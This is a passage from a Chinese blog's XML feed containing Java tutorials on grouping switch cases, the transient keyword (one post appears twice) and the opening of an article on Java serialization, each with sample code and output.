        <content type="html"><![CDATA[<p>我们都知道 <code>switch</code> 用来走流程分支，大多情况下用来匹配单个值，如下面的例子所示：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** * @from  * @author 栈长 *&#x2F;private static void test(int value) &#123;    switch (value) &#123;        case 1:            System.out.println(&quot;1&quot;);            break;        case 2:            System.out.println(&quot;1&quot;);            break;        case 3:            System.out.println(&quot;1&quot;);            break;        case 4:            System.out.println(&quot;1&quot;);            break;        case 5:            System.out.println(&quot;1&quot;);            break;        case 6:            System.out.println(&quot;0&quot;);            break;        case 7:            System.out.println(&quot;0&quot;);            break;        default:            System.out.println(&quot;-1&quot;);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相关阅读：<a href="https://mp.weixin.qq.com/s/QuchavZfEexwAgUS5qgB_Q">switch case 支持的 6 种数据类型</a>。</p><p>大概的意思就是，周一到周五输出：1，周六到周日输出：0，默认输出-1。</p><p>这样写，很多重复的逻辑，冗余了。</p><p>也许这个例子不是很合适，用 if&#x2F; else 更恰当，但这只是个例子，实际开发中肯定会有某几个 case 匹配同一段逻辑的情况。</p><p>那么，如何让多个 case 匹配同一段逻辑呢？</p><p>如下面例子所示：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** *  * @author 栈长 *&#x2F;private static void test(int value) &#123;    switch (value) &#123;        case 1: case 2: case 3: case 4: case 5:            System.out.println(&quot;1&quot;);            break;        case 6: case 7:            System.out.println(&quot;0&quot;);            break;        default:            System.out.println(&quot;-1&quot;);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把相同逻辑的 case 放一起，最后一个 case 写逻辑就行了。</p><p>格式化后就是这样了：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;** *  * @author 栈长 *&#x2F;private static void test(int value) &#123;    switch (value) &#123;        case 1:         case 2:         case 3:         case 4:         case 5:            System.out.println(&quot;1&quot;);            break;        case 6:         case 7:            System.out.println(&quot;0&quot;);            break;        default:            System.out.println(&quot;-1&quot;);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>是不是很骚？</p><p>其实这不是最合适的最好的写法，在 Java 12 中还可以更骚。</p><p>在 Java 12 中可以用逗号来分开多个值，还能用 <code>lambda</code> 表达式，甚至还能省略 break，使用 <code>switch</code> 更方便。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你真的搞懂 transient  关键字了吗？</title>
      <link href="/2025/10/14/%E5%9F%BA%E7%A1%80/%E4%BD%A0%E7%9C%9F%E7%9A%84%E6%90%9E%E6%87%82%20transient%20%20%E5%85%B3%E9%94%AE%E5%AD%97%E4%BA%86%E5%90%97%EF%BC%9F/"/>
      <url>/2025/10/14/%E5%9F%BA%E7%A1%80/%E4%BD%A0%E7%9C%9F%E7%9A%84%E6%90%9E%E6%87%82%20transient%20%20%E5%85%B3%E9%94%AE%E5%AD%97%E4%BA%86%E5%90%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="先解释下什么是序列化"><a href="#先解释下什么是序列化" class="headerlink" title="先解释下什么是序列化"></a>先解释下什么是序列化</h2><p>我们的对象并不只是存在内存中，还需要传输网络，或者保存起来下次再加载出来用，所以需要Java序列化技术。</p><p>Java序列化技术正是将对象转变成一串由二进制字节组成的数组，可以通过将二进制数据保存到磁盘或者传输网络，磁盘或者网络接收者可以在对象的属类的模板上来反序列化类的对象，达到对象持久化的目的。</p><p>更多序列化请参考：《<a href="https://mp.weixin.qq.com/s/wHmK1kKyne6gCkIxt0NERQ">关于Java序列化你应该知道的一切</a>》这篇文章。</p><h2 id="什么是-transient？"><a href="#什么是-transient？" class="headerlink" title="什么是 transient？"></a>什么是 transient？</h2><p>简单来说就是，被 transient 修饰的变量不能被序列化。</p><p><strong>具体来看下面的示例1</strong></p><pre class="line-numbers language-none"><code class="language-none">import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;&#x2F;** * @author  *&#x2F;public class TransientTest &#123;public static void main(String[] args) throws Exception &#123;User user &#x3D; new User();user.setUsername(&quot;Java技术&quot;);user.setId(&quot;javastack&quot;);System.out.println(&quot;\n序列化之前&quot;);System.out.println(&quot;username: &quot; + user.getUsername());System.out.println(&quot;id: &quot; + user.getId());ObjectOutputStream os &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;d:&#x2F;user.txt&quot;));os.writeObject(user);os.flush();os.close();ObjectInputStream is &#x3D; new ObjectInputStream(new FileInputStream(&quot;d:&#x2F;user.txt&quot;));user &#x3D; (User) is.readObject();is.close();System.out.println(&quot;\n序列化之后&quot;);System.out.println(&quot;username: &quot; + user.getUsername());System.out.println(&quot;id: &quot; + user.getId());&#125;&#125;&#x2F;** * @author  *&#x2F;class User implements Serializable &#123;private static final long serialVersionUID &#x3D; 1L;private String username;private transient String id;public String getUsername() &#123;return username;&#125;public void setUsername(String username) &#123;this.username &#x3D; username;&#125;public String getId() &#123;return id;&#125;public void setId(String id) &#123;this.id &#x3D; id;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>输出结果：</strong></p><pre class="line-numbers language-none"><code class="language-none">序列化之前username: Java技术id: javastack序列化之后username: Java技术id: null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例1在 id 字段上加了 transient 关键字修饰，反序列化出来之后值为 null，说明了被 transient 修饰的变量不能被序列化。</p><h2 id="静态变量能被序列化吗？"><a href="#静态变量能被序列化吗？" class="headerlink" title="静态变量能被序列化吗？"></a>静态变量能被序列化吗？</h2><p>这个话题也是最近栈长的Java技术vip群里面讨论的，大家对这个知识点比较模糊，我就写了这篇文章测试总结一下。</p><p><img src="http://img.javastack.cn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190214162351.png"></p><blockquote><p>如果你也想加入我们的Java技术vip群和各位大牛一起讨论技术，那点击<a href="https://mp.weixin.qq.com/s/iqCLAduVzDqt19L6D4FCUQ">这个链接</a>了解加入吧。</p></blockquote><p>那么，到底静态变量能被序列化吗？废话少说，先动手测试下吧！</p><p>示例2：</p><pre class="line-numbers language-none"><code class="language-none">import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;&#x2F;** * @author  *&#x2F;public class TransientStaticTest &#123;public static void main(String[] args) throws Exception &#123;User2 user &#x3D; new User2();User2.username &#x3D; &quot;Java技术1&quot;;user.setId(&quot;javastack&quot;);System.out.println(&quot;\n序列化之前&quot;);System.out.println(&quot;username: &quot; + user.getUsername());System.out.println(&quot;id: &quot; + user.getId());ObjectOutputStream os &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;d:&#x2F;user.txt&quot;));os.writeObject(user);os.flush();os.close();&#x2F;&#x2F; 在反序列化出来之前，改变静态变量的值User2.username &#x3D; &quot;Java技术2&quot;;ObjectInputStream is &#x3D; new ObjectInputStream(new FileInputStream(&quot;d:&#x2F;user.txt&quot;));user &#x3D; (User2) is.readObject();is.close();System.out.println(&quot;\n序列化之后&quot;);System.out.println(&quot;username: &quot; + user.getUsername());System.out.println(&quot;id: &quot; + user.getId());&#125;&#125;&#x2F;** * @author  *&#x2F;class User2 implements Serializable &#123;private static final long serialVersionUID &#x3D; 1L;public static String username;private transient String id;public String getUsername() &#123;return username;&#125;public String getId() &#123;return id;&#125;public void setId(String id) &#123;this.id &#x3D; id;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>输出结果：</strong></p><pre class="line-numbers language-none"><code class="language-none">序列化之前username: Java技术1id: javastack序列化之后username: Java技术2id: null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例2把 username 改为了 public static, 并在反序列化出来之前改变了静态变量的值，结果可以看出序列化之后的值并非序列化进去时的值。</p><p>由以上结果分析可知，静态变量不能被序列化，示例2读取出来的是 username 在 JVM 内存中存储的值。</p><h2 id="transient-真不能被序列化吗？"><a href="#transient-真不能被序列化吗？" class="headerlink" title="transient 真不能被序列化吗？"></a>transient 真不能被序列化吗？</h2><p>继续来看示例3：</p><pre class="line-numbers language-none"><code class="language-none">import java.io.Externalizable;import java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectInput;import java.io.ObjectInputStream;import java.io.ObjectOutput;import java.io.ObjectOutputStream;&#x2F;** * @author  *&#x2F;public class ExternalizableTest &#123;public static void main(String[] args) throws Exception &#123;User3 user &#x3D; new User3();user.setUsername(&quot;Java技术&quot;);user.setId(&quot;javastack&quot;);ObjectOutput objectOutput &#x3D; new ObjectOutputStream(new FileOutputStream(new File(&quot;javastack&quot;)));objectOutput.writeObject(user);ObjectInput objectInput &#x3D; new ObjectInputStream(new FileInputStream(new File(&quot;javastack&quot;)));user &#x3D; (User3) objectInput.readObject();System.out.println(user.getUsername());System.out.println(user.getId());objectOutput.close();objectInput.close();&#125;&#125;&#x2F;** * @author  *&#x2F;class User3 implements Externalizable &#123;private static final long serialVersionUID &#x3D; 1L;public User3() &#123;&#125;private String username;private transient String id;public String getUsername() &#123;return username;&#125;public void setUsername(String username) &#123;this.username &#x3D; username;&#125;public String getId() &#123;return id;&#125;public void setId(String id) &#123;this.id &#x3D; id;&#125;@Overridepublic void writeExternal(ObjectOutput objectOutput) throws IOException &#123;objectOutput.writeObject(id);&#125;@Overridepublic void readExternal(ObjectInput objectInput) throws IOException, ClassNotFoundException &#123;id &#x3D; (String) objectInput.readObject();&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>输出结果：</strong></p><pre class="line-numbers language-none"><code class="language-none">nulljavastack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>示例3的 id 被 transient 修改了，为什么还能序列化出来？那是因为 User3 实现了接口 Externalizable，而不是 Serializable。</p><p>在 Java 中有两种实现序列化的方式，Serializable 和 Externalizable，可能大部分人只知道 Serializable 而不知道 Externalizable。</p><p>这两种序列化方式的区别是：实现了 Serializable 接口是自动序列化的，实现 Externalizable 则需要手动序列化，通过 writeExternal 和 readExternal 方法手动进行，这也是为什么上面的 username 为 null 的原因了。</p><h2 id="transient-关键字总结"><a href="#transient-关键字总结" class="headerlink" title="transient 关键字总结"></a>transient 关键字总结</h2><p>1）transient修饰的变量不能被序列化；</p><p>2）transient只作用于实现 Serializable 接口；</p><p>3）transient只能用来修饰普通成员变量字段；</p><p>4）不管有没有 transient 修饰，静态变量都不能被序列化；</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你真的搞懂 transient 关键字了吗？</title>
      <link href="/2025/10/14/%E5%9F%BA%E7%A1%80/%E4%BD%A0%E7%9C%9F%E7%9A%84%E6%90%9E%E6%87%82%20transient%20%E5%85%B3%E9%94%AE%E5%AD%97%E4%BA%86%E5%90%97%EF%BC%9F/"/>
      <url>/2025/10/14/%E5%9F%BA%E7%A1%80/%E4%BD%A0%E7%9C%9F%E7%9A%84%E6%90%9E%E6%87%82%20transient%20%E5%85%B3%E9%94%AE%E5%AD%97%E4%BA%86%E5%90%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="先解释下什么是序列化"><a href="#先解释下什么是序列化" class="headerlink" title="先解释下什么是序列化"></a>先解释下什么是序列化</h2><p>我们的对象并不只是存在内存中，还需要传输网络，或者保存起来下次再加载出来用，所以需要Java序列化技术。</p><p>Java序列化技术正是将对象转变成一串由二进制字节组成的数组，可以通过将二进制数据保存到磁盘或者传输网络，磁盘或者网络接收者可以在对象的属类的模板上来反序列化类的对象，达到对象持久化的目的。</p><p>更多序列化请参考：《<a href="https://mp.weixin.qq.com/s/wHmK1kKyne6gCkIxt0NERQ">关于Java序列化你应该知道的一切</a>》这篇文章。</p><h2 id="什么是-transient？"><a href="#什么是-transient？" class="headerlink" title="什么是 transient？"></a>什么是 transient？</h2><p>简单来说就是，被 transient 修饰的变量不能被序列化。</p><p><strong>具体来看下面的示例1</strong></p><pre class="line-numbers language-none"><code class="language-none">import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;&#x2F;** * @author  *&#x2F;public class TransientTest &#123;public static void main(String[] args) throws Exception &#123;User user &#x3D; new User();user.setUsername(&quot;Java技术&quot;);user.setId(&quot;javastack&quot;);System.out.println(&quot;\n序列化之前&quot;);System.out.println(&quot;username: &quot; + user.getUsername());System.out.println(&quot;id: &quot; + user.getId());ObjectOutputStream os &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;d:&#x2F;user.txt&quot;));os.writeObject(user);os.flush();os.close();ObjectInputStream is &#x3D; new ObjectInputStream(new FileInputStream(&quot;d:&#x2F;user.txt&quot;));user &#x3D; (User) is.readObject();is.close();System.out.println(&quot;\n序列化之后&quot;);System.out.println(&quot;username: &quot; + user.getUsername());System.out.println(&quot;id: &quot; + user.getId());&#125;&#125;&#x2F;** * @author  *&#x2F;class User implements Serializable &#123;private static final long serialVersionUID &#x3D; 1L;private String username;private transient String id;public String getUsername() &#123;return username;&#125;public void setUsername(String username) &#123;this.username &#x3D; username;&#125;public String getId() &#123;return id;&#125;public void setId(String id) &#123;this.id &#x3D; id;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>输出结果：</strong></p><pre class="line-numbers language-none"><code class="language-none">序列化之前username: Java技术id: javastack序列化之后username: Java技术id: null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例1在 id 字段上加了 transient 关键字修饰，反序列化出来之后值为 null，说明了被 transient 修饰的变量不能被序列化。</p><h2 id="静态变量能被序列化吗？"><a href="#静态变量能被序列化吗？" class="headerlink" title="静态变量能被序列化吗？"></a>静态变量能被序列化吗？</h2><p>这个话题也是最近栈长的Java技术vip群里面讨论的，大家对这个知识点比较模糊，我就写了这篇文章测试总结一下。</p><p><img src="http://img.javastack.cn/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190214162351.png"></p><blockquote><p>如果你也想加入我们的Java技术vip群和各位大牛一起讨论技术，那点击<a href="https://mp.weixin.qq.com/s/iqCLAduVzDqt19L6D4FCUQ">这个链接</a>了解加入吧。</p></blockquote><p>那么，到底静态变量能被序列化吗？废话少说，先动手测试下吧！</p><p>示例2：</p><pre class="line-numbers language-none"><code class="language-none">import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;&#x2F;** * @author  *&#x2F;public class TransientStaticTest &#123;public static void main(String[] args) throws Exception &#123;User2 user &#x3D; new User2();User2.username &#x3D; &quot;Java技术1&quot;;user.setId(&quot;javastack&quot;);System.out.println(&quot;\n序列化之前&quot;);System.out.println(&quot;username: &quot; + user.getUsername());System.out.println(&quot;id: &quot; + user.getId());ObjectOutputStream os &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;d:&#x2F;user.txt&quot;));os.writeObject(user);os.flush();os.close();&#x2F;&#x2F; 在反序列化出来之前，改变静态变量的值User2.username &#x3D; &quot;Java技术2&quot;;ObjectInputStream is &#x3D; new ObjectInputStream(new FileInputStream(&quot;d:&#x2F;user.txt&quot;));user &#x3D; (User2) is.readObject();is.close();System.out.println(&quot;\n序列化之后&quot;);System.out.println(&quot;username: &quot; + user.getUsername());System.out.println(&quot;id: &quot; + user.getId());&#125;&#125;&#x2F;** * @author  *&#x2F;class User2 implements Serializable &#123;private static final long serialVersionUID &#x3D; 1L;public static String username;private transient String id;public String getUsername() &#123;return username;&#125;public String getId() &#123;return id;&#125;public void setId(String id) &#123;this.id &#x3D; id;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>输出结果：</strong></p><pre class="line-numbers language-none"><code class="language-none">序列化之前username: Java技术1id: javastack序列化之后username: Java技术2id: null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例2把 username 改为了 public static, 并在反序列化出来之前改变了静态变量的值，结果可以看出序列化之后的值并非序列化进去时的值。</p><p>由以上结果分析可知，静态变量不能被序列化，示例2读取出来的是 username 在 JVM 内存中存储的值。</p><h2 id="transient-真不能被序列化吗？"><a href="#transient-真不能被序列化吗？" class="headerlink" title="transient 真不能被序列化吗？"></a>transient 真不能被序列化吗？</h2><p>继续来看示例3：</p><pre class="line-numbers language-none"><code class="language-none">import java.io.Externalizable;import java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectInput;import java.io.ObjectInputStream;import java.io.ObjectOutput;import java.io.ObjectOutputStream;&#x2F;** * @author  *&#x2F;public class ExternalizableTest &#123;public static void main(String[] args) throws Exception &#123;User3 user &#x3D; new User3();user.setUsername(&quot;Java技术&quot;);user.setId(&quot;javastack&quot;);ObjectOutput objectOutput &#x3D; new ObjectOutputStream(new FileOutputStream(new File(&quot;javastack&quot;)));objectOutput.writeObject(user);ObjectInput objectInput &#x3D; new ObjectInputStream(new FileInputStream(new File(&quot;javastack&quot;)));user &#x3D; (User3) objectInput.readObject();System.out.println(user.getUsername());System.out.println(user.getId());objectOutput.close();objectInput.close();&#125;&#125;&#x2F;** * @author  *&#x2F;class User3 implements Externalizable &#123;private static final long serialVersionUID &#x3D; 1L;public User3() &#123;&#125;private String username;private transient String id;public String getUsername() &#123;return username;&#125;public void setUsername(String username) &#123;this.username &#x3D; username;&#125;public String getId() &#123;return id;&#125;public void setId(String id) &#123;this.id &#x3D; id;&#125;@Overridepublic void writeExternal(ObjectOutput objectOutput) throws IOException &#123;objectOutput.writeObject(id);&#125;@Overridepublic void readExternal(ObjectInput objectInput) throws IOException, ClassNotFoundException &#123;id &#x3D; (String) objectInput.readObject();&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>输出结果：</strong></p><pre class="line-numbers language-none"><code class="language-none">nulljavastack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>示例3的 id 被 transient 修改了，为什么还能序列化出来？那是因为 User3 实现了接口 Externalizable，而不是 Serializable。</p><p>在 Java 中有两种实现序列化的方式，Serializable 和 Externalizable，可能大部分人只知道 Serializable 而不知道 Externalizable。</p><p>这两种序列化方式的区别是：实现了 Serializable 接口是自动序列化的，实现 Externalizable 则需要手动序列化，通过 writeExternal 和 readExternal 方法手动进行，这也是为什么上面的 username 为 null 的原因了。</p><h2 id="transient-关键字总结"><a href="#transient-关键字总结" class="headerlink" title="transient 关键字总结"></a>transient 关键字总结</h2><p>1）transient修饰的变量不能被序列化；</p><p>2）transient只作用于实现 Serializable 接口；</p><p>3）transient只能用来修饰普通成员变量字段；</p><p>4）不管有没有 transient 修饰，静态变量都不能被序列化；</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于 Java 序列化你不知道的 5 件事</title>
      <link href="/2025/10/14/%E5%9F%BA%E7%A1%80/%E5%85%B3%E4%BA%8E%20Java%20%E5%BA%8F%E5%88%97%E5%8C%96%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%205%20%E4%BB%B6%E4%BA%8B/"/>
      <url>/2025/10/14/%E5%9F%BA%E7%A1%80/%E5%85%B3%E4%BA%8E%20Java%20%E5%BA%8F%E5%88%97%E5%8C%96%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%205%20%E4%BB%B6%E4%BA%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="关于本系列"><a href="#关于本系列" class="headerlink" title="关于本系列"></a>关于本系列</h3><p>大约一年前，一个负责管理应用程序所有用户设置的开发人员，决定将用户设置存储在一个 Hashtable中，然后将这个 Hashtable 序列化到磁盘，以便持久化。当用户更改设置时，便重新将 Hashtable 写到磁盘。</p><p>这是一个优雅的、开放式的设置系统，但是，当团队决定从 Hashtable 迁移到 Java Collections 库中的HashMap 时，这个系统便面临崩溃。</p><p>Hashtable 和 HashMap 在磁盘上的格式是不相同、不兼容的。除非对每个持久化的用户设置运行某种类型的数据转换实用程序（极其庞大的任务），否则以后似乎只能一直用Hashtable 作为应用程序的存储格式。</p><p>团队感到陷入僵局，但这只是因为他们不知道关于 Java 序列化的一个重要事实：Java 序列化允许随着时间的推移而改变类型。当我向他们展示如何自动进行序列化替换后，他们终于按计划完成了向 HashMap 的转变。</p><p>本文是本系列的第一篇文章，这个系列专门揭示关于 Java 平台的一些有用的小知识 — 这些小知识不易理解，但对于解决 Java 编程挑战迟早有用。</p><p>将 Java 对象序列化 API 作为开端是一个不错的选择，因为它从一开始就存在于 JDK 1.1 中。本文介绍的关于序列化的 5 件事情将说服您重新审视那些标准 Java API。</p><h3 id="Java-序列化简介"><a href="#Java-序列化简介" class="headerlink" title="Java 序列化简介"></a>Java 序列化简介</h3><p>Java 对象序列化是 JDK 1.1 中引入的一组开创性特性之一，用于作为一种将 Java 对象的状态转换为字节数组，以便存储或传输的机制，以后，仍可以将字节数组转换回 Java 对象原有的状态。</p><p>实际上，序列化的思想是 “冻结” 对象状态，传输对象状态（写到磁盘、通过网络传输等等），然后 “解冻” 状态，重新获得可用的 Java 对象。所有这些事情的发生有点像是魔术，这要归功于 ObjectInputStream&#x2F;ObjectOutputStream 类、完全保真的元数据以及程序员愿意用Serializable 标识接口标记他们的类，从而 “参与” 这个过程。</p><p>清单 1 显示一个实现 Serializable 的 Person 类。</p><p><strong>清单 1. Serializable Person</strong></p><pre class="line-numbers language-none"><code class="language-none">package com.tedneward;public class Person    implements java.io.Serializable&#123;    public Person(String fn, String ln, int a)    &#123;        this.firstName &#x3D; fn; this.lastName &#x3D; ln; this.age &#x3D; a;    &#125;    public String getFirstName() &#123; return firstName; &#125;    public String getLastName() &#123; return lastName; &#125;    public int getAge() &#123; return age; &#125;    public Person getSpouse() &#123; return spouse; &#125;    public void setFirstName(String value) &#123; firstName &#x3D; value; &#125;    public void setLastName(String value) &#123; lastName &#x3D; value; &#125;    public void setAge(int value) &#123; age &#x3D; value; &#125;    public void setSpouse(Person value) &#123; spouse &#x3D; value; &#125;    public String toString()    &#123;        return &quot;[Person: firstName&#x3D;&quot; + firstName +             &quot; lastName&#x3D;&quot; + lastName +            &quot; age&#x3D;&quot; + age +            &quot; spouse&#x3D;&quot; + spouse.getFirstName() +            &quot;]&quot;;    &#125;        private String firstName;    private String lastName;    private int age;    private Person spouse;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将 Person 序列化后，很容易将对象状态写到磁盘，然后重新读出它，下面的 JUnit 4 单元测试对此做了演示。</p><p><strong>清单 2. 对 Person 进行反序列化</strong></p><pre class="line-numbers language-none"><code class="language-none">public class SerTest&#123;    @Test public void serializeToDisk()    &#123;        try        &#123;            com.tedneward.Person ted &#x3D; new com.tedneward.Person(&quot;Ted&quot;, &quot;Neward&quot;, 39);            com.tedneward.Person charl &#x3D; new com.tedneward.Person(&quot;Charlotte&quot;,                &quot;Neward&quot;, 38);            ted.setSpouse(charl); charl.setSpouse(ted);            FileOutputStream fos &#x3D; new FileOutputStream(&quot;tempdata.ser&quot;);            ObjectOutputStream oos &#x3D; new ObjectOutputStream(fos);            oos.writeObject(ted);            oos.close();        &#125;        catch (Exception ex)        &#123;            fail(&quot;Exception thrown during test: &quot; + ex.toString());        &#125;        try        &#123;            FileInputStream fis &#x3D; new FileInputStream(&quot;tempdata.ser&quot;);            ObjectInputStream ois &#x3D; new ObjectInputStream(fis);            com.tedneward.Person ted &#x3D; (com.tedneward.Person) ois.readObject();            ois.close();            assertEquals(ted.getFirstName(）， &quot;Ted&quot;);            assertEquals(ted.getSpouse().getFirstName(）， &quot;Charlotte&quot;);            &#x2F;&#x2F; Clean up the file            new File(&quot;tempdata.ser&quot;).delete();        &#125;        catch (Exception ex)        &#123;            fail(&quot;Exception thrown during test: &quot; + ex.toString());        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>到现在为止，还没有看到什么新鲜的或令人兴奋的事情，但是这是一个很好的出发点。我们将使用 Person 来发现您可能不 知道的关于 Java 对象序列化 的 5 件事。</p><h4 id="1-序列化允许重构"><a href="#1-序列化允许重构" class="headerlink" title="1. 序列化允许重构"></a>1. 序列化允许重构</h4><p>序列化允许一定数量的类变种，甚至重构之后也是如此，ObjectInputStream 仍可以很好地将其读出来。<br>Java Object Serialization 规范可以自动管理的关键任务是：</p><ul><li><p>将新字段添加到类中</p></li><li><p>将字段从 static 改为非 static</p></li><li><p>将字段从 transient 改为非 transient</p></li></ul><p>取决于所需的向后兼容程度，转换字段形式（从非 static 转换为 static 或从非 transient 转换为 transient）或者删除字段需要额外的消息传递。</p><p><strong>重构序列化类</strong></p><p>既然已经知道序列化允许重构，我们来看看当把新字段添加到 Person 类中时，会发生什么事情。</p><p>如清单 3 所示，PersonV2 